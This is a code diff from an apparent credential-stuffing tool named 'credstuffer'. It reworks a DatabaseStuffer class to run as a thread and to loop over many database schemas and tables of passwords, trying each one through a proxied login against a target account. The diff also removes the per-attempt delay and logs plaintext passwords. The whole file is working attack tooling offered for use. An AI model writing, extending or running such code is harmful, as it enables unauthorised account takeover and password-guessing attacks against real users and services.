@@ -1,54 +1,57 @@
 import logging
-import multiprocessing
+import threading
 from time import sleep
 
 from credstuffer.dbhandler import DBHandler
 from credstuffer.stuffer import Stuffer
 
 
-class DatabaseStuffer(Stuffer, multiprocessing.Process):
+class DatabaseStuffer(Stuffer, threading.Thread):
     """ class DatabaseStuffer to execute the stuffing algorithm with data from database
 
     USAGE:
-            databasestuffer = DatabaseStuffer(account=account, schema_char='a', tables='abcdefghijklmnopqrstuvwxyz',
+            databasestuffer = DatabaseStuffer(account=account, schemas='a', tables='abcdefghijklmnopqrstuvwxyz',
                                               **dbparams)
             databasestuffer.start()
     """
-    def __init__(self, account, schema_char, tables='abcdefghijklmnopqrstuvwxyz', **dbparams):
+    def __init__(self, account, schemas='abcdefghijklmnopqrstuvwxyz', tables='abcdefghijklmnopqrstuvwxyz', **dbparams):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class DatabaseStuffer')
 
         # init base classes
         Stuffer.__init__(self, account=account)
-        multiprocessing.Process.__init__(self)
-
-        self.schema_char = schema_char
-        self.table_list = list(tables)
-        self.dbparams = dbparams
-
-    def run(self) -> None:
-        """ executes the run process for account logins """
+        threading.Thread.__init__(self)
 
         # create database handler
-        dbhandler = DBHandler(**self.dbparams)
+        self.dbparams = dbparams
+        self.dbhandler = DBHandler(**self.dbparams)
+        # prepare schemas and tables
+        self.schema_list = list(schemas)
+        self.table_list = list(tables)
+
+    def run(self) -> None:
+        """ executes the run thread for account logins """
+
         # set proxy to account
         self.set_account_proxy()
 
-        # iterate over tables
-        for table_char in self.table_list:
-            if self.schema_char == 'symbols':
-                self.logger.info("fetch data from {}.{}".format(self.schema_char, self.schema_char))
-                passwords_data = dbhandler.fetch_data(schema=self.schema_char, table=self.schema_char)
-            else:
-                self.logger.info("fetch data from {}.{}".format(self.schema_char, table_char))
-                passwords_data = dbhandler.fetch_data(schema=self.schema_char, table=table_char)
-            for entry in passwords_data:
-                if entry[0]:
-                    password = entry[0]
-                    # execute login
-                    self.account_login(password=password)
-                    sleep(0.001)
-
+        # iterate over schemas
+        for schema_char in self.schema_list:
+            # iterate over tables
+            for table_char in self.table_list:
+                if schema_char == 'symbols':
+                    self.logger.info("fetch data from {}.{}".format(schema_char, schema_char))
+                    passwords_data = self.dbhandler.fetch_data(schema=schema_char, table=schema_char)
+                else:
+                    self.logger.info("fetch data from {}.{}".format(schema_char, table_char))
+                    passwords_data = self.dbhandler.fetch_data(schema=schema_char, table=table_char)
+                for row, entry in enumerate(passwords_data):
+                    if entry[0]:
+                        password = entry[0]
+                        # execute login
+                        self.account_login(password=password)
+                        if (row % 1000) == 0:
+                            self.logger.info("Database row {} with password {}".format(row, password))
 
 
 
